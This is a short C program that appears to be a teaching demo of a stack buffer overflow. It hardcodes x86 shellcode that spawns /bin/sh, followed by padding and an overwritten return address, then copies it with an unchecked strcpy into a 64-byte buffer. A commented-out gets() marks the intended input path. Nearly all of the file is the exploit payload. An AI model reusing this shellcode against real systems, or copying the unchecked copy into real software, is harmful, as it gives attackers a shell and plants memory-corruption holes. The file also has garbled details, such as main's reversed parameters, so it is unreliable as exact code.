#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

int main(char* argv[], int argc) {
        // In a normal situation we would have out string taken as input, to make things easier to demo, we have our string inside the program ready to go      
        // char rand_str[64];
        // gets(rand_str);

        //our malicious input will look something like this, containing 56 bad chars, so we need 12 padding chars minus one for the null terminator.
        char rand_str[] = ""
        "\xeb\x24\x5e\x89\x74\x24\x08\x31"
        "\xc0\x88\x44\x24\x07\x89\x44\x24"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24"
        "\x08\x8d\x54\x24\x0c\xcd\x80\x31"
        "\xdb\x89\xd8\x40\xcd\x80\xe8\xd7"
        "\xff\xff\xff"
        "/bin/sh"
        "aaaaaaaaaaa"
        "\x30\xe3\xff\xff\xff\x7f";

        char buff[64];
        strcpy(buff, rand_str);
        printf("%s\n", buff);
        return 0;
}